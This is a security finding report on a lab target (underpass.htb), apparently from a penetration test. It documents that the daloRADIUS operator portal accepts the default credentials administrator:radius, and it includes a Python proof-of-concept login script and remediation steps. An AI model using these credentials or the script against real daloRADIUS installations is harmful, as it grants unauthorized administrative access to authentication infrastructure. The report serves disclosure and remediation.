# Weak Default Operator Credentials Allow Unauthorized daloRADIUS Administrative Access

**ID:** vuln-0001
**Severity:** CRITICAL
**Found:** 2026-03-06 19:37:36 UTC
**Target:** http://underpass.htb
**Endpoint:** /daloradius/app/operators/dologin.php
**Method:** POST
**CWE:** CWE-521
**CVSS:** 9.4

## Description

Overview:
The daloRADIUS operator authentication interface accepted a weak/default credential pair and granted full administrative access to the management console. The login endpoint for operators allowed authentication with credentials that are commonly used in default or insecure deployments, resulting in immediate compromise of the administrative control plane.

Severity and CVSS (vector only):
High severity. CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L

Affected asset(s):
underpass.htb
daloRADIUS operator portal at /daloradius/app/operators/login.php and /daloradius/app/operators/dologin.php

Technical details:
The operator login flow accepted the credential pair administrator:radius and redirected the session to the authenticated dashboard (home-main.php), setting a valid operator session cookie. This indicates insufficient credential hardening and absence of secure initial credential controls. The issue is exploitable remotely over HTTP without prior access.

Proof of concept:
The issue is reproducible by requesting the login form, extracting the CSRF token, and posting default credentials to the operator login handler. A successful login is confirmed by redirect behavior and authenticated dashboard content.

Impact:
An unauthenticated attacker can obtain administrative access to daloRADIUS. This enables visibility and potential modification of user records, RADIUS-related settings, accounting data, and operational configuration. It also creates a pivot point for further attacks against internal authentication infrastructure and connected services.

## Impact

Unauthorized administrative access to daloRADIUS can result in full compromise of AAA management workflows, credential material exposure, user/account manipulation, disruption of authentication services, and downstream lateral movement. Business impact includes service integrity loss, unauthorized data access, and significant operational risk to network access control environments.

## Technical Analysis

The authentication control failed to enforce secure credential policy in practice because a weak/default operator credential remained valid in production exposure. The login process includes CSRF protection, but this does not mitigate credential abuse when weak defaults are accepted. Successful authentication returned an operator session cookie and dashboard access, confirming complete bypass of intended administrative access restrictions through credential weakness rather than technical bypass.

Evidence observed during validation:
Successful authentication with administrator/radius
Session cookie issuance: daloradius_operator_sid
Post-auth landing page: /daloradius/app/operators/home-main.php (Dashboard)

## Proof of Concept

1. Navigate to http://underpass.htb/daloradius/app/operators/login.php.
2. Capture the CSRF token from the hidden form field csrf_token.
3. Submit a POST request to /daloradius/app/operators/dologin.php with:
   operator_user=administrator
   operator_pass=radius
   location=default
   csrf_token={captured_token}
4. Observe a redirect to index.php/home-main.php and operator session cookie issuance.
5. Confirm authenticated dashboard access at /daloradius/app/operators/home-main.php.

```
import re
import requests

BASE = "http://underpass.htb"
LOGIN_PAGE = f"{BASE}/daloradius/app/operators/login.php"
DOLOGIN = f"{BASE}/daloradius/app/operators/dologin.php"
DASHBOARD = f"{BASE}/daloradius/app/operators/home-main.php"

def main():
    s = requests.Session()

    r = s.get(LOGIN_PAGE, timeout=10)
    r.raise_for_status()

    m = re.search(r'name="csrf_token" type="hidden" value="([^"]+)"', r.text)
    if not m:
        raise RuntimeError("CSRF token not found")
    csrf = m.group(1)

    data = {
        "operator_user": "administrator",
        "operator_pass": "radius",
        "location": "default",
        "csrf_token": csrf
    }

    login_resp = s.post(DOLOGIN, data=data, allow_redirects=True, timeout=10)
    final_url = login_resp.url
    cookies = s.cookies.get_dict()

    print("Final URL:", final_url)
    print("Cookies:", cookies)

    dash = s.get(DASHBOARD, timeout=10)
    print("Dashboard status:", dash.status_code)
    print("Dashboard marker present:", "Dashboard :: daloRADIUS" in dash.text)

    if "home-main.php" in final_url and "daloradius_operator_sid" in cookies:
        print("[+] Vulnerable: weak/default credentials grant admin access")
    else:
        print("[-] Not confirmed")

if __name__ == "__main__":
    main()
```

## Remediation

1. Immediately rotate all operator credentials and remove any default/guessable accounts.
2. Enforce strong password policy for operator accounts:
   minimum length, complexity, deny common passwords, and password history checks.
3. Require unique per-installation bootstrap credentials generated at provisioning time.
4. Implement account lockout/rate limiting and monitoring on operator login endpoints.
5. Restrict operator interface exposure using network ACLs and IP allowlisting where feasible.
6. Enable MFA for administrative/operator accounts.
7. Review all operator accounts and remove unused or legacy privileged users.
8. Perform credential hygiene review across related services to prevent credential reuse.
